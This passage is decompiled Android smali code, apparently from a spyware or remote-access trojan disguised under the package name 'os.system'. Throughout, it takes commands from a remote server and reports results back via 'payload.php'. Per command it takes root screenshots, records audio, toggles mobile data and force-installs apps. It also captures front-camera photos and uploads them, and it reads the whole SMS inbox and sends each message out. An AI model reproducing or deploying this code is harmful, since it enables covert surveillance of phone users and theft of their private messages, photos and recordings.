    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "layar menyala"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 200
    :cond_6
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "screen"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    .line 201
    new-instance v2, Ljava/text/SimpleDateFormat;

    const-string v3, "HH:mm:ss"

    invoke-direct {v2, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v3, Ljava/util/Date;

    invoke-direct {v3}, Ljava/util/Date;-><init>()V

    invoke-virtual {v2, v3}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    .line 203
    const/4 v2, 0x1

    :try_start_0
    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "screencap -p "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, p0

    iget-object v5, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v5, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/screen.jpg"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    .line 204
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    invoke-virtual {v3, v2}, Los/system/ReceiverBoot;->rootCommands([Ljava/lang/String;)V

    .line 205
    const-wide/16 v2, 0x1388

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 207
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/uploadFile.php"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 208
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const-string v2, "upload"

    sput-object v2, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 209
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/screen.jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 210
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v2, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 213
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "screenshoot dan upload berhasil"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 222
    :cond_7
    :goto_1
    :try_start_1
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-net-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 223
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "hidup"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    .line 224
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const/4 v2, 0x1

    move-object/from16 v0, p1

    invoke-static {v2, v0}, Los/system/ReceiverBoot;->setGSM(ZLandroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 232
    :cond_8
    :goto_2
    :try_start_2
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-out-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 233
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v4, "utf"

    const/4 v5, 0x1

    aget-object v2, v2, v5

    invoke-interface {v3, v4, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 234
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 236
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->settings:Landroid/content/SharedPreferences;

    const-string v4, "utf"

    const-string v5, ""

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_15

    .line 241
    :goto_3
    :try_start_3
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-audio-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 243
    const/4 v3, 0x2

    aget-object v3, v2, v3

    const-string v4, "start"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_c

    .line 244
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const/4 v4, 0x1

    aget-object v4, v2, v4

    const/4 v5, 0x2

    aget-object v2, v2, v5

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v4, v2}, Los/system/ReceiverBoot;->audio(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 245
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "audio dijalankan"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 254
    :goto_4
    :try_start_4
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-install-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 255
    const/4 v3, 0x1

    aget-object v3, v2, v3

    sput-object v3, Los/system/System;->install_app:Ljava/lang/String;

    .line 256
    const/4 v3, 0x2

    aget-object v2, v2, v3

    sput-object v2, Los/system/System;->install_paket:Ljava/lang/String;

    .line 258
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->insHandler:Landroid/os/Handler;

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->insRefresh:Ljava/lang/Runnable;

    const-wide/16 v4, 0x1388

    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 260
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "sedang paksa install aplikasi"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_14

    .line 265
    :goto_5
    :try_start_5
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-sms-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 266
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "baca"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_19

    .line 267
    new-instance v8, Ljava/lang/StringBuffer;

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    .line 269
    invoke-virtual/range {p0 .. p0}, Los/system/System;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "content://sms/inbox"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v4

    .line 270
    invoke-interface {v4}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_18

    .line 272
    :cond_9
    const-string v3, ""

    .line 273
    const/4 v2, 0x0

    :goto_6
    invoke-interface {v4}, Landroid/database/Cursor;->getColumnCount()I

    move-result v5

    if-ge v2, v5, :cond_d

    .line 274
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, ""

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-interface {v4, v2}, Landroid/database/Cursor;->getColumnName(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, ":"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-interface {v4, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    move-result-object v3

    .line 273
    add-int/lit8 v2, v2, 0x1

    goto :goto_6

    .line 163
    :cond_a
    sget-object v2, Los/system/System;->TAG:Ljava/lang/String;

    const-string v3, ">>>>> super mati"

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 164
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v3, "swmain"

    sget-object v4, Los/system/System;->payloadWebResultSwitch:Ljava/lang/String;

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 165
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    goto/16 :goto_0

    .line 215
    :catch_0
    move-exception v2

    .line 217
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "screenshoot gagal"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    .line 226
    :cond_b
    const/4 v3, 0x1

    :try_start_6
    aget-object v2, v2, v3

    const-string v3, "mati"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_8

    .line 227
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const/4 v2, 0x0

    move-object/from16 v0, p1

    invoke-static {v2, v0}, Los/system/ReceiverBoot;->setGSM(ZLandroid/content/Context;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto/16 :goto_2

    .line 229
    :catch_1
    move-exception v2

    goto/16 :goto_2

    .line 248
    :cond_c
    :try_start_7
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const/4 v4, 0x1

    aget-object v4, v2, v4

    const/4 v5, 0x2

    aget-object v2, v2, v5

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v4, v2}, Los/system/ReceiverBoot;->audio(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 249
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "audio dimatikan"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    goto/16 :goto_4

    .line 251
    :catch_2
    move-exception v2

    goto/16 :goto_4

    .line 276
    :cond_d
    :try_start_8
    invoke-virtual {v8, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 278
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v5, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v5, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v5, "/payload.php?outpayload="

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 280
    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-nez v2, :cond_9

    .line 281
    sget-object v2, Los/system/System;->TAG:Ljava/lang/String;

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    .line 304
    :goto_7
    :try_start_9
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-foto-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 305
    new-instance v3, Los/system/CamRuntime;

    invoke-direct {v3}, Los/system/CamRuntime;-><init>()V

    .line 306
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    sput-object v3, Los/system/CamRuntime;->path:Ljava/lang/String;

    .line 308
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "depan"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_e

    .line 309
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "rm "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, p0

    iget-object v5, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v5, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/foto.jpg"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    .line 311
    const-string v3, "depan"

    move-object/from16 v0, p1

    invoke-static {v0, v3}, Los/system/CamRuntime;->capturePhoto(Landroid/content/Context;Ljava/lang/String;)V

    .line 312
    const-wide/16 v4, 0x7d0

    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 314
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/uploadFile.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 315
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const-string v3, "upload"

    sput-object v3, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 316
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/foto.jpg"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 317
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v3, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 320
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "kamera sukses sedang mengupload"

    move-object/from16 v0, p0

    invoke-virtual {v0, v4}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

